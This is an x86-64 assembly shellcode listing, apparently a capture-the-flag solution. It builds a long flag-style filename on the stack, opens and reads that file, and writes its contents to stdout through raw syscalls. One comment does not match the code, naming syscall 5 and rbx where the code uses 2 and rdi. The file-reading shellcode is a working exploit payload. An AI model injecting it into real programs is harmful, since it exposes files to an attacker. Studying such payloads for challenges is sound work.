[BITS 64]
; make room for filename on stack
sub rsp, 240
mov rbx, rsp

;write filename to stack
mov dword [rbx+0], 1936287860
mov dword [rbx+4], 1601399135
mov dword [rbx+8], 1634629488
mov dword [rbx+12], 778398818
mov dword [rbx+16], 1717531243
mov dword [rbx+20], 1600610668
mov dword [rbx+24], 1701603686
mov dword [rbx+28], 1701605471
mov dword [rbx+32], 1600484193
mov dword [rbx+36], 1684104562
mov dword [rbx+40], 1768453215
mov dword [rbx+44], 1768316787
mov dword [rbx+48], 1932420460
mov dword [rbx+52], 2037543535
mov dword [rbx+56], 1701344351
mov dword [rbx+60], 1818846815
mov dword [rbx+64], 1634623333
mov dword [rbx+68], 1767859565
mov dword [rbx+72], 1702256499
mov dword [rbx+76], 1818196338
mov dword [rbx+80], 1869573999
mov dword [rbx+84], 1869573999
mov dword [rbx+88], 1869573999
mov dword [rbx+92], 1869573999
mov dword [rbx+96], 1869573999
mov dword [rbx+100], 1869573999
mov dword [rbx+104], 1869573999
mov dword [rbx+108], 1869573999
mov dword [rbx+112], 1869573999
mov dword [rbx+116], 1869573999
mov dword [rbx+120], 1869573999
mov dword [rbx+124], 1869573999
mov dword [rbx+128], 1869573999
mov dword [rbx+132], 1869573999
mov dword [rbx+136], 1869573999
mov dword [rbx+140], 1869573999
mov dword [rbx+144], 1869573999
mov dword [rbx+148], 1869573999
mov dword [rbx+152], 1869573999
mov dword [rbx+156], 808464432
mov dword [rbx+160], 808464432
mov dword [rbx+164], 808464432
mov dword [rbx+168], 808464432
mov dword [rbx+172], 808464432
mov dword [rbx+176], 808464432
mov dword [rbx+180], 1869573936
mov dword [rbx+184], 1869573999
mov dword [rbx+188], 1869573999
mov dword [rbx+192], 1869573999
mov dword [rbx+196], 1869573999
mov dword [rbx+200], 1869573999
mov dword [rbx+204], 808464432
mov dword [rbx+208], 808464432
mov dword [rbx+212], 808464432
mov dword [rbx+216], 812593263
mov dword [rbx+220], 812593263
mov dword [rbx+224], 812593263
mov dword [rbx+228], 6778479

; open the file (rax=5, rbx = filepath, rcx = 0)
        ; int open(const char *pathname, int flags)
        mov rax, 2
mov rdi, rbx
syscall

; read the file (rax=0, rdi = fd, rsi = buffer, rdx = buffer size)
sub rsp, 128
mov rdi, rax
xor rax, rax
        mov rsi, rsp
mov rdx, 128
syscall

; write to stdout (rax=1, rdi = fd, rsi = buffer, rdx = buffer size)
        ; ssize_t write(int fd, const void *buf, size_t count)
        mov rdx, rax
 mov rax, 1
mov rdi, 1
mov rsi, rsp
syscall

; exit program
        ; void _exit(int status)
        mov rax, 60
xor rdi, rdi
syscall
